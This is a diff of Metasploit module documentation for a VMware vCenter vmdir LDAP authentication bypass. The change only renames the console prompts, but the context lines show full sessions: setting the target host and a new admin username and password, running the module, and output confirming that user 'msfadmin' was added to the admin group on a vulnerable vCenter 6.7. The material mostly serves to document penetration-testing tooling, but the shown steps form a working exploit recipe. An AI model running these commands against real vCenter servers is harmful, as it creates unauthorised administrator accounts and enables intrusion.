@@ -55,7 +55,7 @@ Set this to the password for the new admin user.
 ### VMware vCenter Server 6.7 virtual appliance on ESXi (vulnerable target)
 
 ```
-msf6 auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) > show options
+msf auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) > show options
 
 Module options (auxiliary/admin/ldap/vmware_vcenter_vmdir_auth_bypass):
 
@@ -95,13 +95,13 @@ Auxiliary action:
 
 
 View the full module info with the info, or info -d command.
-msf5 auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) > set rhosts [redacted]
+msf auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) > set rhosts [redacted]
 rhosts => [redacted]
-msf5 auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) > set new_username msfadmin
+msf auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) > set new_username msfadmin
 new_username => msfadmin
-msf5 auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) > set new_password msfadmin
+msf auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) > set new_password msfadmin
 new_password => msfadmin
-msf5 auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) > run
+msf auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) > run
 [*] Running module against [redacted]
 not verifying SSL hostname of LDAPS server '[redacted]:636'
 
@@ -145,13 +145,13 @@ vmwpasswordprohibitedpreviouscount: [redacted]
 [+] Added user msfadmin, so auth bypass was successful!
 [+] Added user msfadmin to admin group
 [*] Auxiliary module execution completed
-msf5 auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) >
+msf auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) >
 ```
 
 ### VMware vCenter Server 6.7.0.2 virtual appliance on ESXi (not vulnerable target)
 
 ```
-msf6 auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) > show options
+msf auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) > show options
 
 Module options (auxiliary/admin/ldap/vmware_vcenter_vmdir_auth_bypass):
 
@@ -191,7 +191,7 @@ Auxiliary action:
 
 
 View the full module info with the info, or info -d command.
-msf6 auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) > show options
+msf auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) > show options
 
 Module options (auxiliary/admin/ldap/vmware_vcenter_vmdir_auth_bypass):
 
@@ -232,7 +232,7 @@ Auxiliary action:
 
 View the full module info with the info, or info -d command.
 
-msf6 auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) > run
+msf auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) > run
 [*] Running module against 192.168.3.32
 
 [*] Using auxiliary/gather/vmware_vcenter_vmdir_ldap as check
